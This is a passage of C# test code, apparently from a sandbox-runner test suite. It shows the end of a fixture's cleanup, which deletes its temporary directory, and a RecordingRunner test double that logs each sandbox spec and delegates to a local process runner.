            Remote.DisposeAsync().AsTask().GetAwaiter().GetResult();
            try { Directory.Delete(_root, recursive: true); } catch { /* best-effort */ }
        }
    }

    /// <summary>Records every spec, runs it on the real local runner, then hands it to <c>afterRun</c> (which snapshots the publish repo at its readback).</summary>
    private sealed class RecordingRunner(Action<SandboxSpec> afterRun) : ISandboxRunner
    {
        private readonly LocalProcessRunner _inner = new();
        public string Kind => "local";
        public List<SandboxSpec> Specs { get; } = new();
        public async Task<SandboxResult> RunAsync(SandboxSpec spec, CancellationToken cancellationToken)
        {
            Specs.Add(spec);
            var result = await _inner.RunAsync(spec, cancellationToken);
            afterRun(spec);
            return result;
        }
    }
}
